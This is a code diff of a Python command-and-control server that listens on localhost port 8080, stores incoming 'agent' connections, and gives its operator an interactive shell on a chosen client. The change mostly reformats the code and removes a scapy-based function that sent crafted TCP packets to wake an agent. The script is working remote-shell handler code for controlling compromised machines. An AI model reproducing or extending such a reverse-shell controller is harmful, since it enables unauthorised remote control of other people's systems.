@@ -2,17 +2,15 @@ import socketserver
 import sys
 import threading
 from socket import error as sock_error
-from scapy.layers.inet import TCP
-from scapy.layers.l2 import Ether
-from scapy.layers.inet import IP
-from scapy.sendrecv import sendp
 
-#Servers address and port
+
+# Servers address and port
 LHOST, LPORT = '127.0.0.1', 8080
+
+
 class TCPHandler(socketserver.BaseRequestHandler):
-    #Begins prompt and starts the receive thread
+    # Begins prompt and starts the recvthread
     def handle(self):
-        global _CLEAN
         recvthread = threading.Thread(target=self.recv_message, args=())
         recvthread.start()
         while True:
@@ -30,7 +28,7 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 print(e)
                 continue
 
-    #A thread that listens for data from the agent
+    # A thread that listens for data from the agent
     def recv_message(self):
         while True:
             try:
@@ -44,29 +42,24 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 print(e)
                 TCPServer(LHOST, LPORT)
 
-#Main class starts the tcp server
+
+# Main class; starts the tcp server
 class TCPServer:
 
     def __init__(self, LHOST, LPORT):
         self.stored_sockets = []
         self.LHOST = LHOST
-        self.LPORT= LPORT
-        self.server =  socketserver.TCPServer((self.LHOST, self.LPORT), TCPHandler)
-        self.check_connections_process = threading.Thread(target=(self.check_for_connections), args=(), daemon=True).start()
+        self.LPORT = LPORT
+        self.server = socketserver.TCPServer((self.LHOST, self.LPORT), TCPHandler)
+        self.check_connections_process = threading.Thread(target=(self.check_for_connections), args=(),
+                                                          daemon=True).start()
         self.main()
 
-    #Send TCP packet on selelcted listening port to agent
-    def ping(self, port):
-        print("pinging")
-        packet = (Ether()/IP(src='127.0.0.1', dst='127.0.0.1')/TCP(sport=8976, dport=port))
-        sendp(packet)
-        print('sent')
-
-    #Start TCPHandler instance as thread to receive agent shell
+    # Start TCPHandler instance as thread to receive agent shell
     def start_handler(self, conn, addr):
         self.server.finish_request(conn, addr)
 
-    #Main prompt to handle connections
+    # Main prompt
     def main(self):
         command_list = ["help", "list", "connect"]
         print("Type help for a list of commands")
@@ -75,8 +68,8 @@ class TCPServer:
                 main_cmd = input("\n>")
 
                 if main_cmd == "list":
-                        for i in self.stored_sockets:
-                            print(i)
+                    for i in self.stored_sockets:
+                        print(i)
 
                 if main_cmd == 'connect':
                     print("{}\n".format(list(enumerate(self.stored_sockets))))
@@ -86,20 +79,18 @@ class TCPServer:
                     handler_thread.start()
                     handler_thread.join()
 
-                elif main_cmd == "ping":
-                    port = int(input("Which port: "))
-                    self.ping(port)
-
                 elif main_cmd == "help":
-                    print("list: Shows a list of connected clients\nconnect: Gives a shell to one of the connected clients\n")
+                    print(
+                        "list: Shows a list of connected clients\nconnect: Gives a shell to one of the connected clients\n")
 
             except IndexError and TypeError and ValueError:
                 continue
 
-    #Checks for connections to server
+    # Checks for connections to server
     def check_for_connections(self):
         while True:
             sock_obj, addr = self.server.get_request()
             self.stored_sockets.append([addr, sock_obj])
+
 
 TCPServer(LHOST, LPORT)
